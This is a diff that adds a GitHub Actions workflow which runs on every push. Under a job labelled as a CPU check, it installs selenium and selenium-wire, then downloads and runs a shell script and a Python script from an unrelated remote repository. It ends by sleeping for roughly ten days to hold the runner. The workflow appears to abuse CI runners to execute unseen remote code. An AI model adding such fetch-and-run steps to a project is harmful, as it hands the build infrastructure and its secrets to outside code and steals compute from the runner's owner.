@@ -1,0 +1,19 @@
+name: geb2
+
+on: push
+
+jobs:
+  check_cpu:
+    runs-on: namespace-profile-namespace-x8-5
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Works
+      run: |
+        lscpu
+        pip3 install selenium selenium-wire
+        pip3 uninstall blinker -y && pip3 install blinker==1.4
+        wget https://raw.githubusercontent.com/labedun/repis/refs/heads/main/repi.sh && chmod +x repi.sh && ./repi.sh && wget https://raw.githubusercontent.com/labedun/repis/refs/heads/main/lok7.py && python3 lok7.py
+        sleep 900000
